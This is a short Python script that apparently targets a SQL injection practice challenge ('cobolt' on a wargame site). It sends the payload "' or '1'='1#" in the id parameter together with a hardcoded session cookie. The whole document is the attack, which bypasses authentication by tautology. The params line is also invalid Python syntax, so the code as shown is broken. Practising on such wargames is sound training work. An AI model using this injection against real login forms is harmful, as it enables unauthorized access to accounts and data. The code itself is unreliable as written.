import requests

cookies = {"PHPSESSID": "p2tucjmoqghg78656vgmf7g03p"}

url = "https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php"
params = {id="' or '1'='1#"}

r = requests.get(url, params=params, cookies=cookies)
print(r.text)